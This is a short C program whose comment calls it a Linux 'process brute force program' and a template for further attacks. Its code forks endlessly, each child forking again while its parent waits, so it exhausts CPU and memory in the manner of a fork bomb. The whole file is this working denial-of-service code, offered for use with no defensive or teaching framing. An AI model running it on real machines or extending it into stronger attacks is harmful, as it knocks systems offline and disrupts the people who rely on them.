/* 
   Simple linux process brute force program.
   Each time a new child is created, and from which another child. 
   By this there is not just one point of failure. 
   And the processes made each time consumes cpu usage and memory.

   The same can be used as a basic template to further brute force attack
   */

#include<stdio.h>
#include<unistd.h>
#include<sys/wait.h>
#include<stdlib.h>

void main()
{
    int pid;
for(;;){
    pid = fork();
    
    if(pid == 0){
        }
    else{
        wait(0);
        exit(0);
        }
    }
}